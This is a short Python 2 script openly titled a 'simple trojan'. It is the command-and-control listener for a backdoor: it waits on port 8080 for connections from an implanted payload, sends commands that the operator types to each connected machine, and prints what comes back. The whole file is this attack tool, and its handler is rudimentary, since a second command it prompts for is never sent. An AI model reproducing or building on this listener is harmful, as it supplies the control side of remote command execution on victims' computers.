##
# SIMPLE TROJAN PYTHON 
#@author - Jerome Themee - security analyst 
#@date - 16/07/2015
##
import socket
import threading
# socket creation
bind_ip = "0.0.0.0" 
bind_port = 8080   

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server.bind((bind_ip,bind_port))  
server.listen(5)  

# listener from the payload
print "[*] listening on %s:%d" %(bind_ip,bind_port) # say hi !

def handle_client(client_socket):
	#send back the packet 
	response = raw_input("which command would you like ?\n")
	client_socket.send(response)
	#print the client data
	request = client_socket.recv(2048)
	print "[*] Received: %s" % request
	response = raw_input("which command would you like ?\n")

#loop for waiting connections
while True: 
	client,addr = server.accept()
	print "[*] Accepted connection from %s:%d" % (addr[0],addr[1])

#threading started
	client_handler = threading.Thread(target=handle_client,args=(client,))
	client_handler.start()
